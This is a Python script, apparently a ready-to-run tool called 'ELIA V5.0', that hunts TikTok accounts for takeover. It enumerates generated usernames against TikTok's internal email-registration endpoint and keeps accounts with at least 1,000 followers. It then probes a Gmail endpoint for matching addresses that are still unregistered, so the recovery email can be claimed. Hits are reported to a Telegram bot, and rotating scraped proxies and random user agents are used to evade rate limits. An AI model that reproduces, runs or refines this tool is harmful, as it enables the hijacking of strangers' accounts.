import requests
import random
import time
import json
import string
import os
import sys
import re
from threading import Thread, Lock
from datetime import datetime
from user_agent import generate_user_agent as ua

# --- [ CONFIGURATION & COLORS ] ---
P = '\x1b[1;97m'  # White
B = '\x1b[1;94m'  # Blue
O = '\x1b[1;96m'  # Cyan
Z = "\033[1;30m"  # Grey
X = '\033[1;33m'  # Yellow
F = '\033[2;32m'  # Green
Z3 = '\033[1;31m' # Red
L = "\033[1;95m"  # Pink
C = '\033[2;35m'  # Purple
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'

# Global Stats
lock = Lock()
stats = {
    "checked": 0,
    "tiktok_reg": 0,
    "tiktok_not_reg": 0,
    "gmail_avail": 0,
    "gmail_not_avail": 0,
    "hits": 0,
    "proxies_count": 0
}

# --- [ PROXY SYSTEM ] ---
proxies_pool = []

def scrape_proxies():
    """Built-in Auto Proxy Scraper for v5.0"""
    global proxies_pool
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=https",
        "https://www.proxyscan.io/download?type=https"
    ]
    while True:
        temp_pool = []
        for source in sources:
            try:
                res = requests.get(source, timeout=10).text
                temp_pool.extend(res.splitlines())
            except: pass
        
        with lock:
            proxies_pool = list(set(temp_pool))
            stats["proxies_count"] = len(proxies_pool)
        
        time.sleep(300) # Refresh every 5 minutes

def get_proxy():
    if not proxies_pool: return None
    p = random.choice(proxies_pool)
    return {"http": f"http://{p}", "https": f"http://{p}"}

# --- [ UI DESIGN ] ---
def banner():
    sd = random.choice([J1, J2, F1, C1])
    os.system('clear||cls')
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 - 𝑽𝟓.𝟎 𝑼𝑳𝑻𝑰𝑴𝑨𝑻𝑬 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(sd + r"""
         ██╗ ███╗   ██╗ ███████╗ ████████╗  █████╗
         ██║ ████╗  ██║ ██╔════╝ ╚══██╔══╝ ██╔══██╗
         ██║ ██╔██╗ ██║ ███████╗    ██║    ███████║
         ██║ ██║╚██╗██║ ╚════██║    ██║    ██╔══██║
         ██║ ██║ ╚████║ ███████║    ██║    ██║  ██║
         ╚═╝ ╚═╝  ╚═══╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝
    """ + f"""
        {X}¸.•´¯`•.¸¸ {F} [꧁ 𝑻𝑰𝑲𝑻𝑶𝑲 𝑹𝑬𝑨𝑳 𝑴𝑨𝑺𝑻𝑬𝑹 𝑯𝑼𝑵𝑻𝑬𝑹 ꧂ ]    {X}¸.•´¯`•.¸¸                       
              {F}AUTO-PROXIES ACTIVE | REAL HUNTING LOGIC
{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
    """)

def update_display():
    with lock:
        c, tr, tnr, ga, gna, h, pc = stats["checked"], stats["tiktok_reg"], stats["tiktok_not_reg"], stats["gmail_avail"], stats["gmail_not_avail"], stats["hits"], stats["proxies_count"]
        sys.stdout.write(f"\r{Z}[{P}{datetime.now().strftime('%H:%M:%S')}{Z}] {O}Check: {P}{c} {Z}| {F}T-Reg: {P}{tr} {Z}| {Z3}T-Not: {P}{tnr} {Z}| {C1}G-Hit: {P}{ga} {Z}| {J2}G-Fail: {P}{gna} {Z}| {F}HITS: {P}{h} {Z}| {B}PROX: {P}{pc} ")
        sys.stdout.flush()

# --- [ CORE HUNTING LOGIC ] ---
class MasterHunter:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id

    def send_hit(self, username, followers):
        tlg = f'''
👑 𝐌𝐀𝐒𝐓𝐄𝐑 𝐇𝐈𝐓 𝐅𝐎𝐔𝐍𝐃 👑
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
👤 𝗨𝘀𝗲𝗿 : {username}
📧 𝗘𝗺𝗮𝗶𝗹 : {username}@gmail.com
📊 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followers:,}
✅ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗥𝗲𝗮𝗹 𝗛𝗶𝘁 (𝗚𝗺𝗮𝗶𝗹 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲)
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
        '''
        try:
            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage", json={
                "chat_id": self.chat_id, "text": tlg,
                "reply_markup": {"inline_keyboard": [[{"text": "Channel", "url": "https://t.me/XRRHX"}]]}
            })
            with lock: stats["hits"] += 1
        except: pass

    def check_gmail(self, email, proxy):
        """Real Gmail Signup Check (Google Lifecycle)"""
        try:
            url = f"https://mail.google.com/mail/gxlu?email={email}"
            res = requests.get(url, headers={'User-Agent': ua()}, proxies=proxy, timeout=7)
            return 'Set-Cookie' not in res.headers
        except: return False

    def check_tiktok(self, email, proxy):
        """Internal TikTok API for Real Registration Check"""
        try:
            url = "https://www.tiktok.com/passport/email/check_email_registered"
            params = {"email": email, "aid": 1233}
            res = requests.get(url, params=params, headers={"User-Agent": ua()}, proxies=proxy, timeout=7).json()
            return res.get("is_registered") == 1
        except: return False

    def get_followers(self, username, proxy):
        try:
            url = f"https://www.tiktok.com/@{username}"
            res = requests.get(url, headers={"User-Agent": ua()}, proxies=proxy, timeout=7)
            match = re.search(r'"followerCount":(\d+)', res.text)
            return int(match.group(1)) if match else 0
        except: return 0

    def start(self):
        while True:
            try:
                proxy = get_proxy()
                # Advanced Pattern Generation
                base = random.choice(["user", "king", "pro", "star", "official", "master", "dark", "light", "love", "life", "gaming", "vlog"])
                suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(2, 4)))
                username = base + suffix
                email = f"{username}@gmail.com"

                with lock: stats["checked"] += 1
                
                if self.check_tiktok(email, proxy):
                    with lock: stats["tiktok_reg"] += 1
                    followers = self.get_followers(username, proxy)
                    if followers >= 1000:
                        if self.check_gmail(email, proxy):
                            with lock: stats["gmail_avail"] += 1
                            self.send_hit(username, followers)
                        else:
                            with lock: stats["gmail_not_avail"] += 1
                else:
                    with lock: stats["tiktok_not_reg"] += 1
                
                update_display()
            except: pass

if __name__ == "__main__":
    banner()
    bot_token = input(f"{P} [{F}?{P}] BOT TOKEN : ")
    chat_id = input(f"{P} [{F}?{P}] CHAT ID   : ")
    threads_num = int(input(f"{P} [{F}?{P}] THREADS   : "))
    
    # Start Proxy Scraper in Background
    Thread(target=scrape_proxies, daemon=True).start()
    print(f"{F} [!] Scraping initial proxies... please wait.{P}")
    while not proxies_pool: time.sleep(1)
    
    hunter = MasterHunter(bot_token, chat_id)
    banner()
    for _ in range(threads_num):
        Thread(target=hunter.start, daemon=True).start()
        
    while True:
        time.sleep(1)
